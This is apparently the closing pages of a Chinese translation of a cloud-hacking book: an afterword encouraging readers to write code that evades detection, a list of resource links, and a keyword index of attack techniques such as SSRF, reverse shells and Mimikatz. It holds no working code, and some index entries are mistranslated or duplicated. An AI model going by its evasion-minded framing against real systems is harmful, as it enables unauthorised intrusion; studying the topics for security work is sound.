无论如何，我希望书中的众多示例能帮助传达至少一个核心信息：安全在于彻底理解一项技术、提问并解构整个过程直到它变得清晰。你挖掘得越深，之后就越容易玩弄。我们编写了大量自定义代码来绕过检测服务或仅仅是为了网络限制。下载代码库，玩玩它，在免费 AWS 账户上尝试，并将其扩展到新的领域。这是通往成功的唯一途径。

黑客愉快！

### 资源

- Matthew Toussain 关于 Google Workspace 黑客攻击的有趣文章：https://www.blackhillsinfosec.com/
- Google 关于使用 OAuth2 访问其 API 的指南：http://bit.ly/2RAzYEx
- Google Workspace 用户账户指南：https://developers.google.com/admin-sdk/directory/v1/guides/manage-users/



- 执行 Google Workspace 域授权的说明：https://developers.google.com/admin-sdk/directory/v1/guides/delegation/
- 关于 Google 服务账户更多信息：https://cloud.google.com/compute/docs/access/service-accounts/
- 关于 AWS 组织和委托管理员的更多信息：https://amzn.to/3766cAL.

# 关键词索引

## 数字
- `169.254.169.254`, 71

## A
- 访问分析器 (`Access Analyzer`), 188
- `AccessKeyId`, 79
- 访问密钥 (`access keys`), 180
- `ActiveX`, 15
- `Aircrack`, 6
- `AirVPN`, 5
- `Akamai`, 60
- `Alpine`, 155
- `Amass`, 55
- 亚马逊资源名称 (`Amazon Resource Names`), 74
- 亚马逊机器映像 (`AMI`), 35
- `AMI ID`, 74
- 反恶意软件扫描接口 (`AMSI`), 12
- `Ansible`, 23, 174
- `Apache`, 23
- `Apache Spark`, 203
- `API`, 132
- `API` 服务器, 123
- 应用负载均衡器 (`Application Load Balancer`), 62
- `ARN`, 74
- 汇编 (`Assembly`), 18
- 攻击基础设施 (`attack infrastructure`), 8
- 攻击性基础设施 (`attacking infrastructure`), 21
- `AWS`, 7, 23, 33, 57, 73, 94, 125, 149, 168
- `AWS` 访问密钥, 212
- `AWS` 访问密钥, 150
- `AWS ALB`, 62
- `AWS` 凭证, 80
- `AWS ECR`, 201
- `AWS IAM`, 80, 134
- `AWS KMS`, 176
- `AWS Lambda`, 170
- `AWS` 组织 (`AWS organization`), 229
- `AWS S3`, 61
- `AWS WAF`, 62

## B
- 后门 (`Backdoor`), 97
- `Base64`, 77
- 二进制植入 (`binary planting`), 154
- 绑定 (`binding`), 122
- `Bitbucket`, 50
- 比特 (`Bitcoin`), 7
- `Biznar`, 47
- 蓝队 (`blue team`), 3
- `Boo-Lang`, 17
- 跳弹服务器 (`bouncing servers`), 7
- 存储桶 (`bucket`), 170
- 漏洞赏金 (`bug bounty`), 60
- `Burp`, 70, 88
- `Burp Suite`, 68

## C
- 缓存投毒 (`cache poisoning`), 143
- 权限 (`capabilities`), 103
- 夺旗赛 (`capture-the-flag (CTF)`), 60
- `Cassandra`, 77
- 内容分发网络 (`CDN`), 60
- `Censys`, 53
- `Certbot`, 23
- 证书日志 (`certificate logs`), 53
- `cgroup`, 30, 102
- `Chef`, 23, 174, 178
- `Chromebooks`, 6
- `CI/CD`, 173
- `CloudBunny`, 61
- 云配置 (`cloud-config`), 75
- 云环境 (`cloud environment`), 60
- `cloud-init`, 38, 75
- 云服务商 (`cloud provider`), 33
- `CloudTrail`, 189, 219, 229
- `CloudTrail Insights`, 188
- `CloudWatch`, 81, 190, 194, 230
- 集群 IP (`cluster IP`), 116
- `CNAME`, 61
- `Cobalt Strike`, 12
- 命令与控制 (`Command and Control (C2)`), 4, 8, 11
- 容器 (`container`), 23
- 容器化 (`containerization`), 24
- 内容分发网络 (`CDN`), 60
- 控制组 (`control groups`), 30
- 控制平面 (`controller plane`), 125
- 菜谱 (`cookbook`), 175
- `CoreOS`, 75
- `Covenant C2`, 16
- `CPM`, 48
- 定时任务 (`cron job`), 160
- 跨站脚本 (`cross-site scripting`), 60

## D
- `DaemonSet`, 158
- 数据湖 (`data lake`), 215
- 数据平面 (`data plane`), 125
- `DEF CON`, 15
- 需求方平台 (`demand-side platform`), 139
- 部署 (`deployment`), 112
- 部署控制器 (`deployment controller`), 118
- 反序列化 (`deserialization`), 141
- 期望状态 (`desired state`), 109
- `DevOps`, 9, 107, 129, 173, 175
- `DHCP`, 71
- `Digital Ocean`, 23
- 有向无环图 (`directed acyclic graph (DAG)`), 208
- `Django`, 91, 93
- `DKIM`, 32
- `DNS`, 226
- `DNS` 暴力破解器 (`DNS bruteforcer`), 55
- `Docker`, 8, 23, 75, 102, 200
- `docker0`, 27
- `Docker API`, 162
- `Dockerfile`, 155
- `Docker Hub`, 28, 158
- 容器中的 Docker (`Docker-in-Docker`), 201
- `docker.sock`, 105
- `Docker socket`, 105
- 域侧平台 (`domain-side platform (DSP)`), 139
- 域名 (`domains`), 32
- 域范围委托 (`domain-wide delegation`), 232

## E
- `EC2`, 34, 79, 144, 203, 217
- `ECR`, 158, 201
- `EDR`, 16
- `Edward Snowden`, 6
- `EKS`, 125, 133, 144, 168
- `Elastic Kubernetes Registry`, 201
- `Elastic Kubernetes Service`, 125
- `Elasticsearch`, 129
- `ELF`, 156
- 电子邮件 (`emails`), 227
- `Empire` 框架 (`Empire framework`), 12
- `etcd`, 118, 125
- `eth0`, 27

## F
- `Fernmelder`, 55
- `flatMap`, 206

## G
- `GCP`, 228
- `Gist`, 52
- `Git`, 51
- `GitHub`, 49, 203, 227
- `GitLeaks`, 51
- `Gmail`, 233
- `Golang`, 98
- `Google`, 46
- `Google Workspace`, 52, 226
- `goroutine`, 99
- `GP`, 46
- `Gretsch Politico`, 45
- `G Suite`, 52
- `GuardDuty`, 81, 189

## H
- 黑基础设施 (`hacking infrastructure`), 4
- `Hashcat`, 6
- `helm`, 150

## I
- `IAM`, 34, 94, 168, 181, 192, 216
- `IAM` 访问器 (`IAM Analyzer`), 188
- `IAM` 访问密钥 (`IAM access keys`), 133
- `IAM` 策略 (`IAM policies`), 82
- `IAM` 角色 (`IAM role`), 79, 133, 144
- `IAM` 角色 (`IAM roles`), 210
- `IETF`, 71
- 镜像层 (`image layer`), 29
- `IMDSv1`, 78
- 代码即基础设施 (`Infrastructure as code`), 33
- 任务力量 (`Internet Task Force`), 71
- `iptables`, 116

## J
- `JAR`, 205
- `Java` 虚拟机 (`Java virtual machine`), 204
- `Jenkins`, 173, 201
- `Jinja2`, 91
- `John Lambert`, 129



# K

- `Kali`, 23
- `Kerberoasting`, 80
- 内核 (`kernel`), 23
- `KMS`, 180
- `Koadic`, 15
- `Kube`, 108, 123, 131
- `Kubectl`, 110
- `kubelet`, 119
- `kube-proxy`, 116
- `Kubernetes`, 107, 121, 136, 156
- `kube-scheduler`, 117

# L

- `Lambda`, 170, 181, 193
- `Let's Encrypt`, 23, 31
- `LinkFinder`, 87
- 本地链路地址 (`link-local addressing`), 71
- `Linux`, 25
- Linux 权限 (`Linux capabilities`), 103

# M

- `Mahmud Ridwan`, 25
- Manifest文件 (`manifest file`), 109, 127
- `map`, 206
- `Marcello Salvati`, 17
- `Masscan`, 56
- `memfd`, 156
- `Merlin`, 13
- 元数据 (`metadata`), 4, 73
- 元数据 API, 78
- `Metasploit`, 11, 23, 156, 205, 210
- `meterpreter`, 156
- `Mimikatz`, 16
- `Minikube`, 109
- `MSBuild`, 18
- `msconsole`, 26
- `mshta`, 15
- 多区域 (`multi-region`), 195

# N

- `NayuOS`, 6
- 网络地址转换 (`NAT`), 113
- 网络桥 (`network bridge`), 27
- `Nginx`, 22, 31
- `Nmap`, 56
- 节点 (`node`), 111, 148
- `NodePort`, 115

# O

- `OpenApi`, 122, 125
- `OpenID`, 134
- `OpSec`, 4
- 组织 `OrganizationAccessRole`, 231
- `OWASP`, 55, 68

# P

- `Parquet`, 214
- 分区 (`partitions`), 206
- 被动侦察 (`passive reconnaissance`), 53
- `PassRole`, 217
- `Patrik Hudak`, 64
- 挂起容器 (`pause containers`), 111, 162
- `PDF`, 46
- 渗透测试 (`pentesters`), 3
- 持久化 (`persistence`), 153
- `phocean`, 26
- Pod (`pod`), 109, 155
- `PostgreSQL`, 215, 222
- `PowerPoint`, 46
- `PowerShell`, 12
- 特权模式 (`privileged mode`), 102
- `ProtonVPN`, 5
- `Python`, 17, 28

# R

- `RBAC`, 122
- `RDD`, 206
- `RDS`, 137
- 侦察 (`reconnaissance`), 56
- `Redis`, 129, 140
- `Redshift`, 215
- 红队 (`red team`), 3
- 反射 (`reflection`), 92
- 注册声明 (`registered claims`), 124
- `regsvr32`, 15
- `ReplicaSet`, 118
- 弹性分布式数据集 (`resilient distributed dataset`), 206
- 资源 (`resource`), 35
- `REST`, 98
- 反向 shell (`reverse shell`), 11
- 基于角色的访问 (`role-based access`), 122
- Rootkit (`rootkit`), 154
- `RTB`, 139
- `Ruby`, 23, 174
- `runC`, 25

# S

- `S3`, 62, 82, 95, 132, 156, 204, 211
- S3 存储桶 (`S3 bucket`), 63, 95
- `s3fs`, 211
- S3 VPC 节点, 96
- 密钥管理器 (`Secrets Manager`), 228
- 安全组 (`security groups`), 36, 74, 95, 221
- 无服务器 (`serverless`), 170
- 服务端请求伪造 (`Server-Side Request Forgery`), 73
- 服务端模板注入 (`server-side template injection`), 89
- 服务 (`service`), 113
- `SES`, 94
- `shhgit`, 50
- `SILENTTRITY`, 17
- `SlideShare`, 46
- `SOCKS`, 68
- 竞价实例 (`spot instances`), 153
- `SQL`, 215, 223
- SQL 注入 (`SQL injections`), 60
- SSH 密钥, 36
- `SSL`, 31
- `SSP`, 129, 139
- `SSRF`, 73
- `SSTI`, 89
- 阶段负载 (`stager`), 11, 15
- `STS`, 146, 171
- 子域名接管 (`subdomain takeover`), 64
- `sublist3r`, 54
- `subprocess.Popen`, 93
- 供应侧平台 (`supply-side platform`), 139
- `surveysandstats.com`, 88
- 系统调用 (`syscall`), 156
- `sysctl`, 103

# T

- `Tails`, 6
- `Terraform`, 8, 33, 135, 190
- `Tor`, 5
- `truffleHog`, 51
- 信任策略 (`trust policy`), 183
- `Twitter`, 47

# U

- `Ubuntu`, 35
- 合并文件系统 (`Union Filesystem`), 28
- 用户数据 (`user data`), 33

# V

- `veth`, 27
- 视频 (`Video`), 14
- 虚拟化 (`virtualization`), 75

# W

- `Web`, 64
- `WebSocket`, 12
- `WEP`, 31
- `Windows`, 74
- `WAF`, 62

# X

- `XML`, 34
- `XOR`, 23
- `XSS`, 60

# Y

- `YAML`, 38
- `Yandex`, 53

# Z

- `ZAP`, 51
- `Zcash`, 6
